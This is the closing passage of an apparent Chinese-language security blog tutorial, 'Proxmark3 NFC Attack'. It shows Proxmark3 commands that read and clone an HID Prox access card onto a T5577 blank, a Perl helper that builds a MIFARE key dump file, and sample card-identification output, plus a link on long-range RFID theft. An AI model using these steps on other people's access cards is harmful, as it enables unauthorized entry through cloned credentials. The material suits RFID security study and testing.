+<h2 id="HID卡-Hacking"><a href="#HID卡-Hacking" class="headerlink" title="HID卡 Hacking"></a>HID卡 Hacking</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; lf search  </span><br><span class="line">HID Prox TAG ID: 2004263f88 (8132) ...</span><br><span class="line"></span><br><span class="line">proxmark3&gt; lf hid fskdemod</span><br><span class="line"></span><br><span class="line">proxmark3&gt; lf hid <span class="built_in">clone</span> 2004263f88  </span><br><span class="line">Cloning tag with ID 2004263f88  </span><br><span class="line"><span class="comment">#db# DONE!</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>hex2dumpkeys.pl</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $v = &lt;&lt;EOF;</span><br><span class="line">  |<span class="number">000</span>|  a0a0a0a0a0a<span class="number">0</span>  | <span class="number">1</span> |  b0b0b0b0b0b<span class="number">0</span>  | <span class="number">1</span> |          </span><br><span class="line">  |<span class="number">001</span>|  a0a0a0a0a0a<span class="number">0</span>  | <span class="number">1</span> |  b0b0b0b0b0b<span class="number">0</span>  | <span class="number">1</span> |</span><br><span class="line">  ...          </span><br><span class="line">  |<span class="number">015</span>|  a0a0a0a0a0a<span class="number">0</span>  | <span class="number">1</span> |  b0b0b0b0b0b<span class="number">0</span>  | <span class="number">1</span> |    </span><br><span class="line">EOF</span><br><span class="line"><span class="keyword">my</span> @a;</span><br><span class="line"><span class="keyword">while</span> ($v =~ <span class="regexp">/.*?([0-9a-f]&#123;12&#125;)/is</span>) &#123; <span class="keyword">push</span> @a, $1; $v = $&#x27;; &#125;</span><br><span class="line"><span class="keyword">open</span> FH, <span class="string">&quot;&gt;dumpkeys.bin&quot;</span>;</span><br><span class="line"><span class="keyword">binmode</span> FH;</span><br><span class="line"><span class="keyword">foreach</span> <span class="keyword">my</span> $odd (<span class="number">0</span>,<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">my</span> $i=$odd;$i&lt;=$#a;$i+=<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">my</span> $s = $a[$i];</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">length</span>($s)) &#123;</span><br><span class="line">      <span class="keyword">print</span> FH <span class="keyword">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="keyword">oct</span>(<span class="string">&#x27;0x&#x27;</span>.substr($s,<span class="number">0</span>,<span class="number">2</span>)));</span><br><span class="line">      $s = <span class="keyword">substr</span>($s, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">close</span> FH;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="常见卡指纹"><a href="#常见卡指纹" class="headerlink" title="常见卡指纹"></a>常见卡指纹</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MIFARE Classic卡</span></span><br><span class="line">TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 </span><br><span class="line">Valid ISO14443A Tag Found - Quiting Search</span><br><span class="line"></span><br><span class="line"><span class="comment">#HID ProxCard</span></span><br><span class="line">HID Prox TAG ID: 2004263f88 (8132) - Format Len: 26bit - FC: 19 - Card: 8132  </span><br><span class="line">Valid HID Prox ID Found!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># EM410x </span></span><br><span class="line">Valid EM410x ID Found! </span><br></pre></td></tr></table></figure>
+
+
+
+<p>有了标签ID，我们现在需要一张空白的RFID卡，可以将标签ID克隆到其中。最好的卡是<a class="link"   target="_blank" rel="noopener" href="https://www.amazon.com/gp/product/B017IP85YW/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B017IP85YW&linkCode=as2&tag=amzref0f-20&linkId=dbfc33ecb4a5609e5e1624b27923dc6c" >T5577<i class="fas fa-external-link-alt"></i></a>，它可以模拟各种低频卡，包括此处讨论的两种卡（HID ProxCard，EM41000）</p>
+<h1 id="远程克隆读取RFID"><a href="#远程克隆读取RFID" class="headerlink" title="远程克隆读取RFID"></a>远程克隆读取RFID</h1><p><a class="link"   target="_blank" rel="noopener" href="https://hackaday.com/2013/11/03/rfid-reader-snoops-cards-from-3-feet-away/" >steal RFID tags from multiple feet away<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://tagbase.ksec.co.uk/tutorials/mifare1k-crack-dupe-dump/" >https://tagbase.ksec.co.uk/tutorials/mifare1k-crack-dupe-dump/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://www.gavinjl.me/proxmark-3-cloning-a-mifare-classic-1k/" >https://www.gavinjl.me/proxmark-3-cloning-a-mifare-classic-1k/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html" >https://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Proxmark3 NFC Attack</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2020-01-25 13:19:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2020/01/proxmark3-nfc-attack/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/NFC/">#NFC</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/01/easy-rm-to-mp3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Easy RM to MP3漏洞分析</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/01/wifi-cracking/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">WiFi Cracking</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">环境准备</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85Proxmark3%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">安装Proxmark3环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4Proxmark3%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81"><span class="nav-number">1.2.</span> <span class="nav-text">确认Proxmark3工作状态</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3%E6%89%87%E5%8C%BA%E5%AF%86%E9%92%A5"><span class="nav-number">2.</span> <span class="nav-text">破解扇区密钥</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BA%E5%8E%82%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5"><span class="nav-number">2.1.</span> <span class="nav-text">出厂默认密钥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4"><span class="nav-number">2.2.</span> <span class="nav-text">密钥字典爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dark-Side-Attack"><span class="nav-number">2.3.</span> <span class="nav-text">Dark-Side Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nested-Authentication-Exploit"><span class="nav-number">2.4.</span> <span class="nav-text">Nested Authentication Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81key%E6%98%AF%E5%90%A6%E6%AD%A3%E7%A1%AE"><span class="nav-number">2.5.</span> <span class="nav-text">验证key是否正确</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E5%8A%A0%E5%AF%86%E6%89%87%E5%8C%BA%E6%95%B0%E6%8D%AE"><span class="nav-number">2.6.</span> <span class="nav-text">读取加密扇区数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%8B%E9%9A%86%E5%8D%A1%E7%89%87"><span class="nav-number">3.</span> <span class="nav-text">克隆卡片</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%8D%A1UID"><span class="nav-number">3.1.</span> <span class="nav-text">修改卡UID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8B%E9%9A%86HID%E5%8D%A1"><span class="nav-number">3.2.</span> <span class="nav-text">克隆HID卡</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%97%85%E6%8E%A2%E9%80%9A%E4%BF%A1"><span class="nav-number">4.</span> <span class="nav-text">嗅探通信</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%8D%A1%E6%95%B0%E6%8D%AE"><span class="nav-number">5.</span> <span class="nav-text">修改卡数据</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E5%8D%A1%E7%89%87"><span class="nav-number">6.</span> <span class="nav-text">模拟卡片</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">7.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%8D%A1UID-1"><span class="nav-number">7.1.</span> <span class="nav-text">修改卡UID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HID%E5%8D%A1-Hacking"><span class="nav-number">7.2.</span> <span class="nav-text">HID卡 Hacking</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%8D%A1%E6%8C%87%E7%BA%B9"><span class="nav-number">8.</span> <span class="nav-text">常见卡指纹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E8%AF%BB%E5%8F%96RFID"><span class="nav-number">9.</span> <span class="nav-text">远程克隆读取RFID</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">10.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
